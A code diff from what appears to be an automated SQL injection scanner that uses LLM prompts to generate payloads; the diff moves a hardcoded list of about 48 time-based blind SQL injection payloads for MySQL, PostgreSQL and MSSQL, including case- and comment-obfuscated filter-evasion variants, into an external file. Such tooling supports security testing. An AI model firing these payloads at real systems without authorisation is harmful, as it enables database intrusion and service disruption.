@@ -18,58 +18,8 @@ from src.core.prompts.sqli import SQLI_GENERATOR_PROMPT, SQLI_ANALYZER_PROMPT
 class SQLiNodes(BaseVulnNodes):
     def __init__(self):
         super().__init__(retry_key="sqli_retry_count")
-
-    # 静态 Payloads (Wapiti Style - 覆盖 MySQL, PostgreSQL, MSSQL 时间盲注)
-    STATIC_PAYLOADS = [
-        "sleep(5)#",
-        "1 or sleep(5)#",
-        "\" or sleep(5)#",
-        "' or sleep(5)#",
-        "\" or sleep(5)=\"",
-        "' or sleep(5)='",
-        "1) or sleep(5)#",
-        "\") or sleep(5)=\"",
-        "') or sleep(5)='",
-        "1)) or sleep(5)#",
-        "\")) or sleep(5)=\"",
-        "')) or sleep(5)='",
-        ";waitfor delay '0:0:5'--",
-        ");waitfor delay '0:0:5'--",
-        "';waitfor delay '0:0:5'--",
-        "\";waitfor delay '0:0:5'--",
-        "');waitfor delay '0:0:5'--",
-        "\");waitfor delay '0:0:5'--",
-        "));waitfor delay '0:0:5'--",
-        "'));waitfor delay '0:0:5'--",
-        "\"));waitfor delay '0:0:5'--",
-        "benchmark(10000000,MD5(1))#",
-        "1 or benchmark(10000000,MD5(1))#",
-        "\" or benchmark(10000000,MD5(1))#",
-        "' or benchmark(10000000,MD5(1))#",
-        "1) or benchmark(10000000,MD5(1))#",
-        "\") or benchmark(10000000,MD5(1))#",
-        "') or benchmark(10000000,MD5(1))#",
-        "1)) or benchmark(10000000,MD5(1))#",
-        "\")) or benchmark(10000000,MD5(1))#",
-        "')) or benchmark(10000000,MD5(1))#",
-        "pg_sleep(5)--",
-        "1 or pg_sleep(5)--",
-        "\" or pg_sleep(5)--",
-        "' or pg_sleep(5)--",
-        "1) or pg_sleep(5)--",
-        "\") or pg_sleep(5)--",
-        "') or pg_sleep(5)--",
-        "1)) or pg_sleep(5)--",
-        "\")) or pg_sleep(5)--",
-        "')) or pg_sleep(5)--",
-        "'And(sElect*fRom(SeleCt+SleEp(3))a/**/uNiOn/**/sElect+1)='",
-        "\"aNd(seLect*From(seLeCt+sleEp(3))a/**/UniOn/**/selEcT+1)=\"",
-        "'/**/And(sEleCt'1'fRom/**/Pg_slEep(3))::text>'0",
-        "\"/**/and(sElect'1'frOm/**/Pg_sLeep(3))::text>\"0",
-        "(sEleCt*fRom(seLect+slEep(3)union/**/sEleCt+1)a)",
-        "'+WAITFOR+DELAY+'0:0:3'--+",
-        ";WAITFOR DELAY '0:0:3'--+"
-    ]
+        # 从文件加载静态 Payloads
+        self.STATIC_PAYLOADS = self._load_static_payloads("src/core/payloads/sqli.txt")
 
     async def strategist_node(self, state: SQLiState) -> dict:
         """调用通用引擎生成 SQLi Payload"""
